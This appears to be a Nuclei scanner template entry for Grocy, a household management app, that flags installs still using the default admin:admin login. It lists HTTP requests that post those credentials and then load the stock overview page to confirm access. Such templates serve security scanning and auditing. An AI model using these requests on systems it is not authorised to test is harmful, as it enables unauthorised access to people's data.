# Nuclei Template: Grocy - Default Admin Credentials
**Template ID:** grocy-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`grocy-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Grocy was found using default credentials admin:admin.Successful authentication grants full access to the household management platform including all stock data, chores, recipes, and user settings.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept: text/html

username={{username}}&password={{password}}

GET /stockoverview HTTP/1.1
Host: {{Hostname}}
Accept: text/html
```

## References
- https://github.com/grocy/grocy
- https://docs.linuxserver.io/images/docker-grocy/
